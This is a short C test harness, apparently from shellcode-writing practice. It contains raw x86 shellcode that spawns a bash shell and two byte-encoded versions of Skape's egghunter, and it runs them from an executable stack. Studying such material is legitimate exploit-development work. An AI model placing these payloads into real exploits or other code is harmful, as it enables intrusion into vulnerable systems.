/*
 egghunter.c
 By Abatchy
 gcc a.c -fno-stack-protector -z execstack -o shellcode.out
*/

#include <stdio.h>
#include <string.h>

#define EGG "\x90\x50\x90\x50"

// Spawns a bash shell
unsigned char secret[] = EGG EGG
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Skape's egghunter: access(2)
unsigned char egghunter1[] = 
"\xbb"
EGG
"\x31\xc9"
"\xf7\xe1"
"\x66\x81\xca\xff\x0f"
"\x42"
"\x60"
"\x8d\x5a\x04"
"\xb0\x21"
"\xcd\x80"
"\x3c\xf2"
"\x61"
"\x74\xed"
"\x39\x1a"
"\x75\xee"
"\x39\x5a\x04"
"\x75\xe9"
"\xff\xe2";

// Skape's egghunter: access(2) revised
unsigned char egghunter2[] = 
"\x31\xd2"
"\x66\x81\xca\xff\x0f"
"\x42"
"\x8d\x5a\x04"
"\x6a\x21"
"\x58"
"\xcd\x80"
"\x3c\xf2"
"\x74\xee"
"\xb8" EGG
"\x89\xd7"
"\xaf"
"\x75\xe9"
"\xaf"
"\x75\xe6"
"\xff\xe7";

int main()
{
    printf("Egg is at %p\n", secret);
    printf("Egghunter size: %d\n", strlen(egghunter1));
    int (*ret)() = (int(*)())egghunter1;
    ret();
}